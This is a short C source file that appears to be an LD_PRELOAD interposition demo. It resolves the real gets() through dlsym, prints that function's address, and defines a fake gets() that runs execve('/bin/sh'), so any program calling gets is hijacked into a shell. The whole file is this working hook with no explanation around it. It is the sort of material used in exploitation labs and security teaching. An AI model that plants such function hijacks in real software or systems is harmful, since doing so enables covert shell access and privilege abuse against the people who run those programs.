#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <unistd.h>

static char* (*real_gets)(char *);

void __attribute__((constructor)) init() {
	dlerror();
	real_gets = dlsym(RTLD_NEXT, "gets");
	printf("Found gets at: 0x%x\n", real_gets);
}

char *gets(char * buf) {
	puts("In fake gets");
	execve("/bin/sh", NULL, NULL);
	return real_gets(buf);
}
